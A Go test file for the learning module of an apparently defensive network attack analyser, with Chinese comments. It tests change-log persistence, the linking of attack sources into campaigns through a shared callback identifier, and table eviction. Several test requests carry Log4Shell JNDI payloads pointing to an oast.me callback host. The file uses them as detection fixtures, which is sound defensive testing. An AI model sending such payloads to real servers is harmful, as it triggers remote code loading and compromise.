package learn

import (
	"fmt"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

// 进化日志已满且有校准中的规则时，重启不会重复写入校准记录、也不会挤掉最早的真实记录。
func TestLoadKeepsFullChangeLog(t *testing.T) {
	path := filepath.Join(t.TempDir(), "learn.json")
	l := newLearner(t, path)
	var batch []Case
	for i := 1; i <= 6; i++ {
		batch = append(batch, fpCase(uint64(i), map[string]int{"xss-dom": 1}, "www.example.com/s", "198.51.100."+strconv.Itoa(i), VerdictFP))
	}
	l.Feedback(batch...)
	if l.Report().Calibrated != 1 {
		t.Fatal("应有一条校准中的规则")
	}
	l.mu.Lock()
	for i := len(l.changes); i < maxChanges; i++ {
		l.logLocked(Change{Time: time.Now().Add(-time.Hour), Kind: "note", Detail: fmt.Sprintf("old-%d", i)})
	}
	before := append([]Change(nil), l.changes...)
	l.mu.Unlock()
	if err := l.Save(); err != nil {
		t.Fatal(err)
	}
	r := newLearner(t, path)
	r.mu.Lock()
	after := append([]Change(nil), r.changes...)
	r.mu.Unlock()
	if len(after) != len(before) {
		t.Fatalf("重启后进化日志条数变化: %d → %d", len(before), len(after))
	}
	for i := range before {
		if before[i].Detail != after[i].Detail || before[i].Kind != after[i].Kind {
			t.Fatalf("重启后第 %d 条进化日志变化: %q → %q", i, before[i].Detail, after[i].Detail)
		}
	}
}

// 两个出口先共用同一回连标识（都未确认），之后其中一个被确认：另一个随之确认，不需要第三个来源加入。
func TestCampaignConfirmAfterSharing(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	atk := []model.Hit{{RuleID: "log4shell", Severity: model.SevHigh}}
	payload := func(n int) string {
		return "/?x=${jndi:ldap://dbke9n6cm7of64pa3q20" + strconv.Itoa(1000000000000+n) + ".oast.me/a}"
	}
	l.ObserveAttack(webEv("198.51.100.1", "GET", payload(1), now), atk)
	l.ObserveAttack(webEv("198.51.100.2", "GET", payload(2), now), atk)
	l.ConfirmSource("198.51.100.1", "evidence", "有证据的成功利用", now)
	if reason, ok := l.confirmedSource("198.51.100.2", now); !ok || !strings.Contains(reason, "同一攻击活动") {
		t.Fatalf("共用回连标识的另一个来源应随之确认: %q", reason)
	}
	// 被确认的来源再次发来带标识的请求时，活动中其余未确认的来源同样确认
	l2 := attackLearner(t, "")
	l2.ObserveAttack(webEv("198.51.100.3", "GET", payload(3), now), atk)
	l2.ObserveAttack(webEv("198.51.100.4", "GET", payload(4), now), atk)
	l2.mu.Lock()
	l2.auto["198.51.100.3"] = &AutoSource{IP: "198.51.100.3", Kind: "evidence", Reason: "导入", Time: now}
	l2.publishAutoLocked()
	l2.mu.Unlock()
	l2.ObserveAttack(webEv("198.51.100.3", "GET", payload(5), now), atk)
	if _, ok := l2.confirmedSource("198.51.100.4", now); !ok {
		t.Fatal("没有新来源加入时也应扩散确认")
	}
	// 只凭模型判断确认的来源不扩散：“同一攻击活动”算作客观依据
	l3 := attackLearner(t, "")
	l3.ObserveAttack(webEv("198.51.100.5", "GET", payload(6), now), atk)
	l3.ObserveAttack(webEv("198.51.100.6", "GET", payload(7), now), atk)
	l3.ConfirmSource("198.51.100.5", "ai", "模型判为攻击", now)
	l3.ObserveAttack(webEv("198.51.100.5", "GET", payload(8), now), atk)
	if _, ok := l3.confirmedSource("198.51.100.6", now); ok {
		t.Fatal("模型的判断不应经攻击活动扩散成客观确认")
	}
}

// 候选请求形态与攻击活动表满了以后淘汰价值最低的条目，新的形态 / 活动仍能进入。
func TestAttackTablesEvict(t *testing.T) {
	l := attackLearner(t, "")
	now := time.Now()
	l.ConfirmSource("203.0.113.5", "evidence", "有证据", now)
	st := &l.atk
	st.mu.Lock()
	for i := range maxCandidates {
		st.cand[fmt.Sprintf("GET /scan%d", i)] = &candidate{example: "x", sources: []string{"203.0.113.9"}, first: now.Add(-time.Hour), last: now.Add(-time.Hour)}
	}
	for i := range maxCampaigns {
		st.campaigns[fmt.Sprintf("k%d.oast", i)] = &Campaign{Key: fmt.Sprintf("k%d.oast", i), IPs: []string{"203.0.113.9"}, First: now.Add(-time.Hour), Last: now.Add(-time.Hour)}
	}
	st.mu.Unlock()
	l.ObserveAttack(webEv("203.0.113.5", "GET", "/brand/new/shape?q=1", now), nil)
	l.ObserveAttack(webEv("203.0.113.5", "GET", "/?x=${jndi:ldap://dbke9n6cm7of64pa3q209999999999999.oast.me/a}", now),
		[]model.Hit{{RuleID: "log4shell", Severity: model.SevHigh}})
	st.mu.Lock()
	defer st.mu.Unlock()
	if len(st.cand) > maxCandidates || len(st.campaigns) > maxCampaigns {
		t.Fatalf("不应超过上限: %d %d", len(st.cand), len(st.campaigns))
	}
	found := false
	for _, c := range st.cand {
		found = found || strings.Contains(c.example, "/brand/new/shape")
	}
	if !found {
		t.Fatal("候选表满后新的请求形态仍应进入")
	}
	if st.campaigns["dbke9n6cm7of64pa3q20.oast"] == nil {
		t.Fatal("活动表满后新的攻击活动仍应进入")
	}
	// 只有一个来源的候选与活动按短保留期清理
	st.mu.Unlock()
	l.mu.Lock()
	l.pruneAttackLocked(now.Add(72*time.Hour), 30)
	l.mu.Unlock()
	st.mu.Lock()
	if len(st.cand) != 0 || len(st.campaigns) != 0 {
		t.Fatalf("只有一个来源的条目 48 小时后应清理: %d %d", len(st.cand), len(st.campaigns))
	}
}
